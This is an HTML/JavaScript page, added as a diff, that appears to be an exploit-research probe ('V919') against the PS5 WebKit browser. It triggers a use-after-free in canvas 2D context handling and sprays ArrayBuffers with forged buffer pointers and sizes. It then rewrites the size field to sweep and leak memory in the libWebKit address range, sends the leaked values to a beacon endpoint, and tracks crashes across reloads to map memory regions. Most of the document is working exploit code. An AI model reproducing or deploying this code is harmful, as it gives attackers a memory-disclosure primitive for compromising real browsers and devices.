@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>V919 - m_size address sweep (module range)</title>
+<style>
+  body { background:#0b0e14; color:#d7e0ea; font-family:ui-monospace,Menlo,monospace; padding:14px; }
+  h1 { color:#58a6ff; font-size:15px; margin:0 0 6px; }
+  p  { color:#8b949e; font-size:12px; margin:4px 0 10px; line-height:1.55; }
+  pre { font-size:12px; white-space:pre-wrap; }
+  table { border-collapse:collapse; font-size:11px; margin-top:8px; }
+  td,th { border:1px solid #30363d; padding:3px 7px; text-align:left; vertical-align:top; }
+  th { color:#58a6ff; }
+  .crash { color:#ff7b72; }
+  .ok { color:#7ee787; }
+  .skip { color:#d29922; }
+  .hit { color:#ffa657; font-weight:bold; }
+  code { color:#c9d1d9; background:#21262d; padding:1px 5px; border-radius:4px; }
+  .key { border-left:3px solid #d29922; padding-left:8px; }
+</style>
+</head>
+<body>
+<h1>V919 - m_size address sweep (module range)</h1>
+
+<p class="key">
+<b>The missing dimension (from the 11-07 review):</b> V906 forged [ptr,1,1] - m_size was
+fixed at 1, so each load tested exactly ONE address. But the read is
+<code>lineWidth = *(m_buffer + (m_size-1)*400 + 48)</code> and <b>both m_buffer AND m_size
+live in our AB - m_size is a 32-bit index with a x400 multiplier, JS-rewritable between
+reads!</b> From any base, m_size covers base..base+1.7TB in 400B steps. A mapped probe
+returns 8 bytes (x5 offsets with the extra reads) and the sweep CONTINUES in the same
+load; an unmapped probe crashes (= the region boundary - the crash itself maps memory).
+<b>Target:</b> PS5 libWebKit base range [0x800000000, 0x900000000), 0x4000-aligned
+(derived from the official chain's site.js). Each case = one random 16KB-aligned
+candidate; if the first probe survives we are inside a mapping and the load leaks the
+region until the boundary. forge-ctl validates the mechanism (crash expected).
+Resume: surviving sweeps continue across loads (up to 1500 probes/case); crashes end the case.
+Beacons: one per surviving probe (k + 5 hex values).
+</p>
+
+<p>
+Start: <b>?op=auto</b> &nbsp;|&nbsp; one case: <b>?case=sweep-001</b> &nbsp;|&nbsp; clear: <b>?reset=1</b>
+<br>After a crash just reopen <b>?op=auto</b>. Done when the page prints <b>ALL CASES DONE</b>.
+</p>
+
+<h2>Cases (24)</h2>
+<pre>
+#0      forge-ctl   base=0x4141414141414000  CRASH expected (mechanism check)
+#1-20   sweep-001..020  random 0x4000-aligned bases in [0x800000000, 0x900000000)
+#21     same-none   control (MISS)
+#22-23  imagedata-16x12, abzero  controls (CRASH)
+</pre>
+
+<pre id="out">starting...</pre>
+<div id="tbl"></div>
+
+<p class="note">Basis: V906 proved the +112 deref with m_size=1 (one address per load). This probe adds the m_size dimension: 100 probes/load, resume across loads, 1500 probes/case cap. A single hit leaks up to ~60KB of a module and pins its base (ELF 0x464C457F backward-sweep in the follow-up).</p>
+
+<script>
+'use strict';
+
+var SEEK = location.pathname;
+var RUN = 'r' + Date.now().toString(36) + '-' + Math.random().toString(36).slice(2, 7);
+
+function lsGet(k) { try { return window.localStorage.getItem('v919_' + k); } catch (e) { return null; } }
+function lsSet(k, v) { try { window.localStorage.setItem('v919_' + k, String(v)); } catch (e) {} }
+function lsDel(k) { try { window.localStorage.removeItem('v919_' + k); } catch (e) {} }
+
+function bks(tag, body) {
+  var u = '/beacon/V919-' + tag + '?d=' +
+          encodeURIComponent(String(body == null ? '' : body).slice(0, 440)) +
+          '&run=' + encodeURIComponent(RUN) + '&t=' + Date.now() + '&s=1';
+  try { var x = new XMLHttpRequest(); x.open('GET', u, false); x.send(null); }
+  catch (e) { try { var i = new Image(); i.src = u; } catch (e2) {} }
+}
+
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+function errOf(e) { return e ? String(e.name || 'Error') + ':' + String(e.message || '').slice(0, 70) : 'none'; }
+function hexOf(x) { var f = new Float64Array(1), u = new Uint32Array(f.buffer); f[0] = x; return '0x' + ('00000000' + u[1].toString(16)).slice(-8) + ('00000000' + u[0].toString(16)).slice(-8); }
+function stLast(id, stage) { try { lsSet('last', id + ':' + stage); } catch (e) {} }
+
+/* ---------- UAF trigger (32 saves) ---------- */
+function trigger(canvas, nsaves) {
+  var saved = null;
+  var dict = {};
+  Object.defineProperty(dict, 'alpha', {
+    get: function () {
+      var ctx = canvas.getContext('2d');
+      if (!ctx) return true;
+      saved = ctx;
+      try {
+        ctx.lineWidth = 3.14159;
+        ctx.miterLimit = 7.77;
+        ctx.globalAlpha = 0.42;
+        ctx.lineDashOffset = 2.222;
+        ctx.shadowBlur = 5.55;
+        for (var s = 0; s < nsaves; s++) ctx.save();
+        ctx.lineWidth = 1.0;
+      } catch (e) {}
+      return true;
+    }
+  });
+  var bmp = null;
+  try { bmp = canvas.getContext('bitmaprenderer', dict); } catch (e2) {}
+  return { saved: saved, bmp: bmp };
+}
+
+/* ---------- sweep forge ---------- */
+var KEEP = null;
+var VIEWS = null;
+function sprayForge(base, k, count) {
+  var lo = base % 0x100000000;
+  var hi = Math.floor(base / 0x100000000);
+  var abs = new Array(count);
+  VIEWS = new Array(count);
+  for (var i = 0; i < count; i++) {
+    var ab = new ArrayBuffer(768);
+    var v = new Uint32Array(ab);
+    v[28] = lo;      /* +112: m_buffer lo */
+    v[29] = hi;      /* +116: m_buffer hi */
+    v[30] = k;       /* +120: m_size / m_capacity */
+    v[31] = k;       /* +124 */
+    abs[i] = ab;
+    VIEWS[i] = v;    /* ONE view per AB, reused across probes (no per-probe alloc) */
+  }
+  KEEP = abs;
+  return abs;
+}
+function rewriteK(abs, k) {
+  for (var i = 0; i < VIEWS.length; i++) {
+    VIEWS[i][30] = k;
+    VIEWS[i][31] = k;
+  }
+}
+
+/* 8 tagged real contexts, MISS detector */
+function tagContexts(n) {
+  var keep = [], made = 0, c;
+  for (c = 0; c < n; c++) {
+    var cc = document.createElement('canvas');
+    cc.width = 1; cc.height = 1;
+    var cx = null;
+    try { cx = cc.getContext('2d'); } catch (e) {}
+    if (cx) {
+      try { cx.lineWidth = 200 + made; } catch (e2) {}
+      keep.push(cc);
+      made++;
+    }
+  }
+  return { keep: keep, made: made };
+}
+
+/* ---------- table ---------- */
+var SEED = 0x1420;
+function rnd() { SEED = (SEED * 1103515245 + 12345) & 0x7FFFFFFF; return SEED / 0x80000000; }
+
+var TABLE = [];
+function add(id, base, kind) { TABLE.push({ id: id, base: base, kind: kind }); }
+
+add('forge-ctl', 0x4141414141414000, 'sweep');
+for (var si = 1; si <= 20; si++) {
+  var cand = 0x800000000 + Math.floor(rnd() * (0x100000000 / 0x4000)) * 0x4000;
+  add('sweep-' + (si < 10 ? '00' + si : '0' + si), cand, 'sweep');
+}
+add('same-none', null, 'none');
+add('imagedata-16x12', null, 'imagedata');
+add('abzero', null, 'abzero');
+
+function findEntry(id) { for (var i = 0; i < TABLE.length; i++) if (TABLE[i].id === id) return TABLE[i]; return null; }
+
+/* ---------- helpers for non-sweep candidates ---------- */
+var HELPER_KEEP = null;
+function buildHelper(e, helper) {
+  var t = e.kind, out = [], i;
+  if (t === 'none') out = [];
+  else if (t === 'imagedata') {
+    out = new Array(16);
+    for (i = 0; i < 16; i++) { try { out[i] = helper.createImageData(16, 12); } catch (e4) { out[i] = null; } }
+  } else if (t === 'abzero') {
+    out = new Array(16);
+    for (i = 0; i < 16; i++) out[i] = new ArrayBuffer(768);
+  }
+  HELPER_KEEP = out;
+  return out;
+}
+
+/* ---------- sweep case ---------- */
+var PROBES_PER_LOAD = 60;
+var KLIMIT = 1500;
+var CRASH_CAP = 15;
+
+function runSweep(id, e) {
+  var resumeK = 1;
+  var rk = lsGet('resume_' + id);
+  if (rk !== null) resumeK = parseInt(rk, 10) || 1;
+
+  var canvas = document.createElement('canvas');
+  canvas.width = 1; canvas.height = 1;
+  document.body.appendChild(canvas);
+  window._v919canvas = canvas;
+
+  var t = trigger(canvas, e.saves !== undefined ? 32 : 32);
+  if (!t.saved || !t.bmp) return { tag: 'THROW', detail: 'trigger-failed', resume: null };
+  stLast(id, 'S1-trigger');
+
+  var abs = sprayForge(e.base, resumeK, 200);
+  stLast(id, 'S2-abforge k=' + resumeK);
+
+  var tk = tagContexts(8);
+  stLast(id, 'S3-tagged made=' + tk.made);
+
+  var k = resumeK, probes = 0, firstK = k;
+  var parts = [];
+
+  while (probes < PROBES_PER_LOAD && k <= KLIMIT) {
+    rewriteK(abs, k);
+    stLast(id, 'S4-k' + k);
+
+    var lw = null, threw = false;
+    try { lw = t.w1 ? t.w1.lineWidth : t.saved.lineWidth; }
+    catch (er) { threw = true; }
+
+    if (threw) {
+      return { tag: 'THROW', detail: 'read-throw@k=' + k, resume: null };
+    }
+
+    probes++;
+
+    var tag = 'SUSPECT';
+    if (typeof lw === 'number' && lw >= 200 && lw < 200 + tk.made) tag = 'MISS';
+
+    if (tag === 'MISS') {
+      return { tag: 'MISS', detail: 'tagger-won@k=' + k + ',probes=' + probes, resume: null };
+    }
+
+    /* survived: leak 5 offsets */
+    var ex = '';
+    try { ex += ',ml=' + hexOf(t.saved.miterLimit); } catch (e1) {}
+    try { ex += ',ga=' + hexOf(t.saved.globalAlpha); } catch (e2b) {}
+    try { ex += ',ldo=' + hexOf(t.saved.lineDashOffset); } catch (e3b) {}
+    try { ex += ',sb=' + hexOf(t.saved.shadowBlur); } catch (e4b) {}
+    bks('P', 'k=' + k + ',lw=' + hexOf(lw) + ex);
+    parts.push('k' + k + '=' + hexOf(lw));
+    k++;
+  }
+
+  lsSet('resume_' + id, String(k));
+  say(id + ' survived ' + probes + ' probes (k ' + firstK + '->' + k + ')');
+
+  if (k > KLIMIT) {
+    return { tag: 'DONE-LIMIT', detail: 'k=' + k + ',probes=' + probes + ',first=' + firstK, resume: null };
+  }
+  return { tag: 'SWEEP-CONT', detail: 'probes=' + probes + ',resume=' + k, resume: k, noMark: true };
+}
+
+/* ---------- standard cases ---------- */
+function runStandard(id, e) {
+  var canvas = document.createElement('canvas');
+  canvas.width = 1; canvas.height = 1;
+  document.body.appendChild(canvas);
+  window._v919canvas = canvas;
+
+  var helperCanvas = document.createElement('canvas');
+  helperCanvas.width = 1; helperCanvas.height = 1;
+  document.body.appendChild(helperCanvas);
+  var helper = null;
+  try { helper = helperCanvas.getContext('2d'); } catch (eH) {}
+
+  var t = trigger(canvas, 32);
+  if (!t.saved || !t.bmp) return { tag: 'THROW', detail: 'trigger-failed' };
+  stLast(id, 'S1-trigger');
+
+  if (e.kind === 'none') {
+    var tkN = tagContexts(24);
+    stLast(id, 'S2-tagged');
+    var lwN = null;
+    try { lwN = t.saved.lineWidth; } catch (eN) { return { tag: 'THROW', detail: 'err' }; }
+    var okN = (typeof lwN === 'number' && lwN >= 200 && lwN < 200 + tkN.made);
+    return { tag: okN ? 'MISS' : 'SUSPECT', detail: 'lw=' + lwN };
+  }
+
+  buildHelper(e, helper);
+  stLast(id, 'S2-candidate');
+  var tk = tagContexts(24);
+  stLast(id, 'S3-tagged');
+  var lw = null;
+  try { lw = t.saved.lineWidth; } catch (eR) { return { tag: 'THROW', detail: 'err' }; }
+  if (typeof lw === 'number' && lw >= 200 && lw < 200 + tk.made) {
+    return { tag: 'MISS', detail: 'lw=' + lw + ' (tagged won)' };
+  }
+  return { tag: 'SUSPECT', detail: 'lw=' + lw + ':' + hexOf(lw) };
+}
+
+function runCase(id) {
+  var e = findEntry(id);
+  if (!e) return { tag: 'SKIP', detail: 'unknown-case' };
+
+  if (e.kind === 'sweep') return runSweep(id, e);
+  return runStandard(id, e);
+}
+
+var SEQUENCE = [];
+for (var qi = 0; qi < TABLE.length; qi++) SEQUENCE.push(TABLE[qi].id);
+
+var EXPECT = {
+  'forge-ctl': 'CRASH expected (mechanism check)',
+  'same-none': 'MISS (control)',
+  'imagedata-16x12': 'CRASH (control)', 'abzero': 'CRASH (control)'
+};
+
+function appendRes(s) { lsSet('res', (lsGet('res') || '') + s + ';'); }
+function isDone(id) { return (lsGet('done') || ';').indexOf(';' + id + ';') >= 0; }
+function markDone(id) { var d = lsGet('done') || ';'; if (d.indexOf(';' + id + ';') < 0) lsSet('done', d + id + ';'); }
+function nextCase() { for (var i = 0; i < SEQUENCE.length; i++) { if (!isDone(SEQUENCE[i])) return SEQUENCE[i]; } return null; }
+
+function esc(s) { return String(s).replace(/&/g, '&').replace(/</g, '<').replace(/>/g, '>'); }
+function render() {
+  var r = lsGet('res') || '';
+  var rows = r.split(';');
+  var html = '<table><tr><th>case</th><th>expected</th><th>result</th><th>detail</th></tr>';
+  for (var i = 0; i < rows.length; i++) {
+    if (!rows[i]) continue;
+    var p = rows[i].split('|');
+    var cls = (p[1] === 'CRASH') ? 'crash' : (p[1] === 'SUSPECT' ? 'hit' : (p[1] === 'SKIP' ? 'skip' : 'ok'));
+    html += '<tr><td>' + esc(p[0]) + '</td><td>' + esc(EXPECT[p[0]] || '') +
+            '</td><td class="' + cls + '">' + esc(p[1]) + '</td><td>' + esc(p[2] || '') + '</td></tr>';
+  }
+  html += '</table>';
+  document.getElementById('tbl').innerHTML = html;
+}
+
+async function runOne(id) {
+  bks('START', 'case=' + id + ',run=' + RUN);
+  lsSet('cur', id);
+  lsSet('last', id + ':S0-enter');
+
+  var r;
+  try { r = runCase(id); }
+  catch (e) { r = { tag: 'THROW', detail: 'harness=' + errOf(e) }; }
+
+  if (r.resume !== undefined && r.resume !== null) {
+    /* sweep continues across loads - do not mark done */
+    lsSet('cur', '');
+    lsSet('last', id + ':S9-cont k=' + r.resume);
+    bks('CONT', 'case=' + id + ',resume=' + r.resume + ',' + (r.detail || ''));
+    say(id + ' -> CONT ' + (r.detail || ''));
+    render();
+    return r;
+  }
+
+  appendRes(id + '|' + r.tag + '|' + (r.detail || ''));
+  markDone(id);
+  lsSet('cur', '');
+  lsSet('last', id + ':S9-done');
+  bks('DONE', 'case=' + id + ',tag=' + r.tag + ',detail=' + (r.detail || '').slice(0, 380));
+  say(id + ' -> ' + r.tag + ' ' + (r.detail || ''));
+  render();
+  return r;
+}
+
+async function main() {
+  var q = location.search;
+
+  if (q.indexOf('reset=1') >= 0) {
+    lsDel('cur'); lsDel('done'); lsDel('res'); lsDel('last');
+    for (var i = 0; i < TABLE.length; i++) {
+      lsDel('resume_' + TABLE[i].id);
+      lsDel('crashes_' + TABLE[i].id);
+    }
+    bks('RESET', 'cleared,run=' + RUN);
+    say('cleared. reopen with ?op=auto');
+    render();
+    return;
+  }
+
+  /* crash detection with sweep-aware resume */
+  var cur = lsGet('cur');
+  if (cur) {
+    var last = lsGet('last') || '?';
+    var e = findEntry(cur);
+    var isSweep = e && e.kind === 'sweep';
+
+    if (isSweep) {
+      var crashes = parseInt(lsGet('crashes_' + cur) || '0', 10) + 1;
+      lsSet('crashes_' + cur, String(crashes));
+      var m = /S4-k(\d+)/.exec(last);
+      var kCrash = m ? parseInt(m[1], 10) : 0;
+
+      if (kCrash > 1 && crashes < CRASH_CAP) {
+        /* mid-region gap: the leaked map ends here - record and close the case */
+        appendRes(cur + '|CRASH|boundary=k=' + kCrash + ',crashes=' + crashes);
+        markDone(cur);
+        lsDel('cur'); lsDel('last');
+        bks('CRASH-DETECTED', 'case=' + cur + ',boundary=k' + kCrash + ',crashes=' + crashes);
+        say('previous sweep hit a boundary: ' + cur + ' at k=' + kCrash + ' (recorded)');
+      } else {
+        /* first-probe crash = candidate unmapped, or crash cap */
+        appendRes(cur + '|CRASH|k=' + kCrash + ',crashes=' + crashes + (kCrash <= 1 ? ',base-unmapped' : ',cap'));
+        markDone(cur);
+        lsDel('cur'); lsDel('last');
+        bks('CRASH-DETECTED', 'case=' + cur + ',k=' + kCrash + ',crashes=' + crashes + (kCrash <= 1 ? ',base-unmapped' : ',cap'));
+        say('previous case CRASHED: ' + cur + ' k=' + kCrash);
+      }
+    } else {
+      appendRes(cur + '|CRASH|last=' + last);
+      markDone(cur);
+      lsDel('cur'); lsDel('last');
+      bks('CRASH-DETECTED', 'case=' + cur + ',last=' + last);
+      say('previous case CRASHED: ' + cur + ' last=' + last);
+    }
+  }
+
+  var m2 = /[?&]case=([^&]+)/.exec(q);
+  var one = m2 ? decodeURIComponent(m2[1]) : '';
+  var auto = (q.indexOf('op=auto') >= 0) || (!one && q.indexOf('case=') < 0);
+
+  if (one) {
+    var rr = await runOne(one);
+    say('single case done: ' + one + ' -> ' + rr.tag);
+    render();
+    return;
+  }
+
+  if (auto) {
+    var id = nextCase();
+    if (!id) {
+      bks('FINAL', 'run=' + RUN + ',res=' + (lsGet('res') || '').slice(0, 440));
+      say('ALL CASES DONE.');
+      render();
+      return;
+    }
+    await runOne(id);
+    var v919delay = (id && id.indexOf('sweep') === 0) ? 4000 : 1200;setTimeout(function () { location.href = SEEK + '?op=auto&r=' + Date.now(); }, v919delay);
+    return;
+  }
+
+  say('ready. use ?op=auto or ?case=<id>');
+  render();
+}
+
+try { main(); } catch (e) { bks('FATAL', String(e && (e.message || e)).slice(0, 160)); say('FATAL ' + e); }
+</script>
+</body>
+</html>
